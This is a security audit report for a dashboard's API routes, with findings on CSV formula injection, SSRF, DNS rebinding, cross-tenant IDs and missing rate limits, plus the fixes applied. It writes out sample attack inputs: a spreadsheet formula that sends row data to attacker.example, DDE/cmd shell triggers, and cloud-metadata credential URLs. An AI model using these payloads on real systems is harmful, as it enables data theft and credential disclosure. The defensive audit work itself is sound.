# MandateZ Dashboard — API Security Audit

**Scope:** every `route.ts` under [apps/dashboard/src/app/api/](src/app/api/) plus the shared auth/RBAC helpers in [apps/dashboard/src/lib/](src/lib/).
**Audit date:** 2026-05-24
**Auditor:** Production-readiness review (pre-launch gate)

This audit covers the six dimensions called out by the security review brief: **auth**, **input validation**, **tenant isolation**, **error leakage**, **edge cases**, and **rate limiting**. 30 route files were reviewed.

---

## Severity legend

- **CRITICAL** — Pre-auth or trivial-auth bypass, data exfiltration, credential disclosure. Block release.
- **HIGH** — Authenticated abuse path that compromises another tenant, the platform, or end-user trust (CSV injection against auditors counts). Fix before launch.
- **MEDIUM** — Defense-in-depth gap, information disclosure that is not directly exploitable, missing controls expected of an enterprise API.
- **LOW** — Hygiene, UX, or polish-grade concern.

---

## Findings summary

| # | Severity | Area | Route(s) | Title |
|---|----------|------|---------|-------|
| 1 | HIGH | Injection | [/api/events/export](src/app/api/events/export/route.ts) | CSV formula injection — auditor RCE vector |
| 2 | HIGH | SSRF | [/api/alerts/test](src/app/api/alerts/test/route.ts) | Authenticated SSRF: arbitrary HTTPS POST with no IP guard |
| 3 | HIGH | SSRF | [/api/proxy](src/app/api/proxy/route.ts) | DNS-rebinding bypass of the proxy SSRF guard |
| 4 | HIGH | Tenant isolation | [/api/policies](src/app/api/policies/route.ts), [/api/policies/from-template](src/app/api/policies/from-template/route.ts) | `body.agent_id` accepted without ownership check |
| 5 | MEDIUM | Disclosure | [/api/attestations/[id]/verify](src/app/api/attestations/%5Bid%5D/verify/route.ts) | Public attestation exposes Supabase `owner_id` (user UUID) |
| 6 | MEDIUM | Error leakage | many | Raw Supabase `error.message` returned to clients |
| 7 | MEDIUM | Rate limit | all routes | No request-rate or per-owner concurrency limits anywhere |
| 8 | MEDIUM | Abuse | [/api/keys/generate](src/app/api/keys/generate/route.ts) | No per-owner key-count cap |
| 9 | MEDIUM | Validation | [/api/organizations](src/app/api/organizations/route.ts) | Org-create email not validated (invite path validates; create does not) |
| 10 | MEDIUM | Validation | [/api/reports/export](src/app/api/reports/export/route.ts) | `from`/`to` query params passed to Supabase unvalidated |
| 11 | MEDIUM | Validation | [/api/reports/generate](src/app/api/reports/generate/route.ts) | No body-size cap; PDF can be very large |
| 12 | LOW | Hygiene | [/api/schedules/trigger](src/app/api/schedules/trigger/route.ts) | `GET` delegates to `POST` (CRON_SECRET still required, but enables accidental cron runs from browsers) |
| 13 | LOW | Hygiene | [/api/proxy](src/app/api/proxy/route.ts) | Unauthenticated `GET` returns service metadata (low signal) |
| 14 | LOW | Edge case | [/api/organizations/[id]](src/app/api/organizations/%5Bid%5D/route.ts) `DELETE` | Returns 500 on nonexistent org instead of 404 |
| 15 | LOW | Hygiene | [/api/policies/from-template](src/app/api/policies/from-template/route.ts) | Stores caller-supplied `template_key` even when not in the canonical set |

---

## Detailed findings

### 1. HIGH — CSV formula injection in `/api/events/export`

**Route:** [apps/dashboard/src/app/api/events/export/route.ts:42](src/app/api/events/export/route.ts#L42)

`escapeCsvCell` correctly quotes cells containing `"`, `,`, `\r`, `\n`, but **does not prefix cells that start with the spreadsheet formula triggers `=`, `+`, `-`, `@`, tab (0x09), or carriage return (0x0D)**. Excel, Google Sheets, and LibreOffice Calc all interpret these prefixes as formulas. The exported fields include `resource`, `policy_id`, `agent_id`, and the agent `name` — all of which are user-controlled (an agent owner sets the resource at `track()` time, and an agent_id is attacker-influenceable via the SDK).

Attack: an attacker registers an agent whose name is `=HYPERLINK("https://attacker.example/exfil?c="&A2,"Click")` or sends an event with `resource=@SUM(1+1)*cmd|...`. When the **compliance auditor** (the exact role we are selling to) exports and opens the CSV, the formula fires. With `=DDE(...)` or `=cmd|...` the formula triggers OS-level shell execution on legacy Windows configurations. With `=HYPERLINK` it silently exfils row data.

This is the canonical reason this app *as a security tool* must not ship with naïve CSV escaping.

**Fix:** Prefix any cell whose first character is one of `= + - @ \t \r` with a leading single quote (`'`). The leading quote is stripped by Excel during display but disarms the formula. Done in the fix commit.

---

### 2. HIGH — Authenticated SSRF in `/api/alerts/test`

**Route:** [apps/dashboard/src/app/api/alerts/test/route.ts:32](src/app/api/alerts/test/route.ts#L32)

Validation is limited to `new URL(value).protocol === 'https:'`. The route then performs `fetch(url, { method: 'POST', body: JSON.stringify(payload) })`. There is **no block list for private/loopback/link-local/cloud-metadata addresses**.

Attack: an authenticated user supplies `https://169.254.169.254/latest/meta-data/iam/security-credentials/<role>` (AWS), `https://metadata.google.internal/...` (GCP), or `https://localhost:8080/admin` (sidecar). Even though the response body is not directly returned to the caller, **the HTTP status code and any error text from `res.text().catch(() => '')` is returned** (line 85–89), which is enough to confirm reachability and probe internal endpoints. A modified body payload can also trigger destructive POSTs against internal services.

Note: `/api/proxy` already implements the correct allowlist pattern (`PRIVATE_IP_PATTERNS`, `BLOCKED_HOSTS`). That same guard must be applied here.

**Fix:** Extract the SSRF guard from `/api/proxy` into a shared helper and reuse it. Done in the fix commit.

---

### 3. HIGH — DNS-rebinding bypass of `/api/proxy` SSRF guard

**Route:** [apps/dashboard/src/app/api/proxy/route.ts:64](src/app/api/proxy/route.ts#L64)

`isBlockedTarget` regex-matches the literal `url.hostname`. If the hostname is an FQDN that resolves to a private IP (e.g. an attacker-controlled `attacker-meta.example` that has an `A` record pointing to `169.254.169.254`), the regex matches *the FQDN*, fails to find a private pattern, and lets the request through. `fetch()` then resolves the hostname and connects to the AWS metadata endpoint.

There is also a classic TOCTOU window: even if we resolve and check at validation time, `fetch()` will resolve again at connect time, and a low-TTL DNS record can point to a public IP at check-time and a private IP at fetch-time.

**Hardening:**
1. Resolve the hostname with `dns.promises.lookup({ all: true })`.
2. Reject if **any** resolved address matches the private/link-local/CGNAT set.
3. Re-resolve and pin (connect by IP, set `Host` header) — but `fetch()` does not expose connect-by-IP, so the practical fix is the DNS check + an outbound-network egress policy at the Vercel/infrastructure layer.

**Fix:** Step 1 + 2 applied in the fix commit. Step 3 documented as a residual-risk follow-up — production infrastructure must restrict outbound egress to public IP ranges.

---

### 4. HIGH — Cross-tenant `agent_id` accepted by policy creation

**Routes:**
- [apps/dashboard/src/app/api/policies/route.ts:62](src/app/api/policies/route.ts#L62) (`POST`)
- [apps/dashboard/src/app/api/policies/from-template/route.ts:62](src/app/api/policies/from-template/route.ts#L62) (`POST`)

Both routes accept `body.agent_id` and embed it into the policy `rules` payload **without checking that the agent belongs to the caller**. Owner A can create a policy whose `agent_id` references Owner B's agent. Because policies are owner-scoped (the parent row is `owner_id = A`), Owner B never sees the policy — but:

- Policy evaluation in the proxy uses `loadPoliciesCached(supabase, ownerId)` which scopes to the caller, so policies from A never run against B's agents. Direct enforcement risk is **low**.
- However, future surfaces (compliance reports, audit dashboards, attestations) that join `policies.rules.agent_id` → `agents.id` can attribute Owner A's policies to Owner B's agents, **polluting the audit trail** of a different tenant. For a compliance product this is a real correctness issue.
- It also enables enumeration: by guessing `ag_…` IDs and observing 200 vs error, an attacker can confirm an agent exists in another tenant.

**Fix:** When `body.agent_id` is provided, look it up and reject if `agent.owner_id !== authedOwnerId`. Done in the fix commit (404, mirroring the existing "do not leak existence across tenants" pattern).

---

### 5. MEDIUM — Public attestation verify exposes Supabase `owner_id`

**Route:** [apps/dashboard/src/app/api/attestations/[id]/verify/route.ts:33](src/app/api/attestations/%5Bid%5D/verify/route.ts#L33)

The verify endpoint is intentionally public (that is the distribution primitive). It returns the full attestation row, including `owner_id`, which is the Supabase `auth.users.id` UUID. That UUID is a stable user identifier across the platform — exposing it enables:
- Enumeration of other endpoints that take `owner_id`.
- Correlation across multiple shared attestations (link attestation A and attestation B to the same operator).
- Targeted attack surface against the user's other resources.

The owner_id is part of the **canonical signed payload** (it has to be, or the attestation could be replayed under a different owner). So we cannot simply remove it without breaking the signature contract.

**Recommendation (not yet applied):** add an opt-in `redact_owner=true` query param that returns `{ ...attestation, owner_id: '<redacted>', owner_hash: sha256(owner_id) }` and skips signature re-verification on the client side (server still does its check). For full local re-verification the holder of the link can request the un-redacted version through an authenticated endpoint.

Not fixed in this pass because it is a design tradeoff that wants product input. Flagged as MEDIUM with a clear remediation path.

---

### 6. MEDIUM — Raw Supabase error messages returned to clients

**Routes:** ~20 routes use the pattern `NextResponse.json({ error: error.message }, { status: 500 })`.

Supabase/PostgREST error messages can contain table names, column names, RLS rule snippets, and (for constraint violations) the offending input. None of this is catastrophic, but it gives an attacker free reconnaissance about the schema.

**Recommendation:** in production, log the full error server-side and return a generic message like `{ error: 'internal_error', request_id: ... }`. Provide a `?debug=1` mode gated to staff API keys.

Not applied in this pass — it is a cross-cutting refactor that wants a dedicated PR with structured logging.

---

### 7. MEDIUM — No rate limiting anywhere

**Scope:** every route.

There is no middleware, no per-key bucket, no per-IP throttle. An attacker with a valid API key can:
- Hammer `/api/proxy` to exhaust outbound egress / cost.
- Mint unlimited keys via `/api/keys/generate`.
- Bulk-issue attestations via `/api/attestations`.
- Tie up the SSE channel `/api/events/stream` indefinitely.
- Exhaust the cron worker by repeatedly invoking `/api/schedules/trigger` (requires CRON_SECRET, so risk is lower).

**Recommendation:** Vercel Edge Middleware + `@upstash/ratelimit` keyed by API-key-hash is the standard fix and is one or two PRs of work. Enterprise tier should have higher quotas; free tier should have aggressive ones.

Not applied in this pass — needs infrastructure decisions (which limiter, where to store buckets, what the tier matrix is).

---

### 8. MEDIUM — `/api/keys/generate` has no per-owner key cap

**Route:** [apps/dashboard/src/app/api/keys/generate/route.ts:39](src/app/api/keys/generate/route.ts#L39)

A holder of any valid key for an owner can mint unlimited additional keys for that owner. Combined with **no rate limiting**, this means a single stolen key cannot be neutralized by revocation alone — the attacker can keep minting fresh keys faster than they can be revoked.

**Recommendation:** enforce a per-owner cap (e.g. 25 live keys) and require owner-role (vs API-key) auth for `generate` if RBAC is layered on top. Not applied in this pass.

---

### 9. MEDIUM — Org-create email is not validated

**Route:** [apps/dashboard/src/app/api/organizations/route.ts:80](src/app/api/organizations/route.ts#L80)

The invite path (`POST /api/organizations/[id]/members`) validates email format; the org-create path checks only that it is non-empty. Inconsistent, easy to fix.

---

### 10. MEDIUM — `/api/reports/export` query params unvalidated

**Route:** [apps/dashboard/src/app/api/reports/export/route.ts:13](src/app/api/reports/export/route.ts#L13)

`from` and `to` are taken from the query string and passed directly to `.gte('timestamp', from)` / `.lte('timestamp', to)`. If `from='not-a-date'`, Supabase returns a 500 and we surface the raw error (see finding #6). It will not lead to data leakage (PostgREST validates types) but it makes the endpoint flaky.

**Recommendation:** wrap with the `parseIsoDate` pattern already used by `/api/events/export`.

---

### 11. MEDIUM — `/api/reports/generate` has no body-size cap

Routes accepting JSON bodies with no `Content-Length` enforcement: `/api/reports/generate`, `/api/policies`, `/api/policies/from-template`, `/api/organizations`, `/api/alerts`, `/api/shadow-scan`, `/api/trust/recalculate`. Next.js default body parser caps at ~1 MB but this is platform-dependent.

**Recommendation:** explicit `MAX_BODY_BYTES` check at the top of each POST handler.

---

### 12. LOW — `/api/schedules/trigger` GET delegates to POST

**Route:** [apps/dashboard/src/app/api/schedules/trigger/route.ts:199](src/app/api/schedules/trigger/route.ts#L199)

Auth is still enforced (CRON_SECRET required), so this is not a bypass. But it makes the cron URL callable from a browser address bar by anyone holding the secret, which is a footgun for accidental over-firing. The author comment explicitly calls this out as intentional for dev convenience — leave as-is, just flag for awareness.

---

### 13. LOW — `/api/proxy` GET reveals service metadata

**Route:** [apps/dashboard/src/app/api/proxy/route.ts:481](src/app/api/proxy/route.ts#L481)

Returns the service name, required headers, and docs path. Information disclosure is minimal (this is exactly what a 404 on `GET /proxy` would have prompted anyway), but in a production hardening sweep, an unauthenticated `GET` should probably 401.

---

### 14. LOW — `DELETE /api/organizations/[id]` returns 500 for nonexistent org

**Route:** [apps/dashboard/src/app/api/organizations/[id]/route.ts:175](src/app/api/organizations/%5Bid%5D/route.ts#L175)

Calls `.single()` then dereferences `org.owner_id`. If the org doesn't exist, `orgError` triggers and we return 500 + raw Supabase message instead of 404.

---

### 15. LOW — `/api/policies/from-template` stores `template_key` unvalidated

**Route:** [apps/dashboard/src/app/api/policies/from-template/route.ts:75](src/app/api/policies/from-template/route.ts#L75)

`findTemplate(templateRef)` succeeds, but the raw `templateRef` (which might be the `id` or the `key`) is stored verbatim in the JSONB. Cosmetic only — the rules themselves come from the canonical template — but it leaks the original user input back into the row.

---

## What is in good shape

The audit also confirmed several non-trivial properties that are correctly implemented:

- **`requireApiKeyAuth` is consistently applied** to every non-public route. The cookie-then-bearer fallback ([apps/dashboard/src/lib/require-auth.ts:48](src/lib/require-auth.ts#L48)) is sound.
- **`bodyOwnerId` cross-check** is consistently applied on POST routes that take an `owner_id` in the body, blocking caller-A from impersonating caller-B by lying in the body.
- **404-on-mismatch pattern** is consistently used (`/api/agents/[id]/revoke`, `/api/keys/[id]/revoke`, `/api/risk/[agentId]`, `/api/risk/compute/[agentId]`, `/api/proxy`) to avoid leaking whether an ID exists across tenants.
- **`/api/events/batch` validates schema, signature, AND owner per event** — three independent gates before any write. Solid.
- **`/api/events/search` sanitizes ILIKE patterns** ([apps/dashboard/src/app/api/events/search/route.ts:75](src/app/api/events/search/route.ts#L75)) — escapes `%` and `_`, strips PostgREST structural chars. Correct.
- **`/api/events/stream` filters realtime by `owner_id`** at the channel-subscription level — no cross-tenant event leakage.
- **RBAC enforcement on org-scoped routes** uses a strict permission matrix ([apps/dashboard/src/lib/rbac.ts:15](src/lib/rbac.ts#L15)).
- **CRON_SECRET enforcement** in `/api/schedules/trigger` correctly fails closed when the env var is missing.
- **Agent ID regex** `/^ag_[A-Za-z0-9_-]+$/` is applied consistently and prevents path-traversal / injection via the ID.

---

## Fix plan

The accompanying fix commit applies the four **HIGH** findings:
1. CSV formula sanitization in `/api/events/export`.
2. SSRF guard in `/api/alerts/test`, sharing the same private-IP block list as the proxy.
3. DNS-resolution check added to `/api/proxy` so FQDNs that resolve to private IPs are rejected.
4. Cross-tenant `agent_id` ownership check on both policy-create endpoints.

The MEDIUM findings (especially **rate limiting** and **error-message sanitization**) should be the next batch — they are cross-cutting and want their own focused PRs rather than a piggyback on this audit.
